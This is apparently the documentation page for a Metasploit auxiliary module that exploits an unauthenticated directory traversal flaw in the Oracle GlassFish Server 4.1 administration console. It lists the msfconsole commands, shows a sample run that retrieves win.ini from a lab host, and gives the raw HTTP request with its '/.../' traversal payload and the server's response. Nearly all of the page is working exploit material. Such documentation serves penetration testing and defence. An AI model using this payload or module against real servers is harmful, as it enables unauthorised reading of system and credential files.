## Vulnerable Application

This module exploits an unauthenticated directory traversal vulnerability which exits in administration console of,
Oracle GlassFish Server 4.1, which is listening by default on port 4848/TCP.

Related links :

* https://www.exploit-db.com/exploits/39441/

## Verification

```
Start msfconsole
use auxiliary/scanner/http/glassfish_traversal
set RHOST
set RHOSTS
run
```

## Scenarios

```
msf > use auxiliary/scanner/http/glassfish_traversal 
msf auxiliary(scanner/http/glassfish_traversal) > set RHOST 192.168.1.103
RHOST => 192.168.1.103
msf auxiliary(scanner/http/glassfish_traversal) > set RHOSTS 192.168.1.103
RHOSTS => 192.168.1.103
msf auxiliary(scanner/http/glassfish_traversal) > run

[+] ; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
[MCI Extensions.BAK]
3g2=MPEGVideo
3gp=MPEGVideo
3gp2=MPEGVideo
3gpp=MPEGVideo
aac=MPEGVideo
adt=MPEGVideo
adts=MPEGVideo
m2t=MPEGVideo
m2ts=MPEGVideo
m2v=MPEGVideo
m4a=MPEGVideo
m4v=MPEGVideo
mod=MPEGVideo
mov=MPEGVideo
mp4=MPEGVideo
mp4v=MPEGVideo
mts=MPEGVideo
ts=MPEGVideo
tts=MPEGVideo

[+] File saved at: /home/inputzero/.msf4/loot/20180731174317_default_192.168.1.103_oracle.glassfish_982307.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(scanner/http/glassfish_traversal) >
```

## HTTP Request

```
GET /.../.../.../.../.../.../.../.../.../windows/win.ini HTTP/1.1
Host: 192.168.1.105:8667
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:61.0) Gecko/20100101 Firefox/61.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

## HTTP Response

```
HTTP/1.1 200 OK
Content-Length: 403
Content-Type: text/plain
Expires: Mon, 30 Jul 2018 11:16:55 GMT
Last-Modified: Tue, 14 Jul 2009 05:09:22 GMT
Server: Microsoft-HTTPAPI/2.0
Date: Sun, 29 Jul 2018 06:46:55 GMT
Connection: close

; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
[MCI Extensions.BAK]
3g2=MPEGVideo
3gp=MPEGVideo
3gp2=MPEGVideo
3gpp=MPEGVideo
aac=MPEGVideo
adt=MPEGVideo
adts=MPEGVideo
m2t=MPEGVideo
m2ts=MPEGVideo
m2v=MPEGVideo
m4a=MPEGVideo
m4v=MPEGVideo
mod=MPEGVideo
mov=MPEGVideo
mp4=MPEGVideo
mp4v=MPEGVideo
mts=MPEGVideo
ts=MPEGVideo
tts=MPEGVideo
```
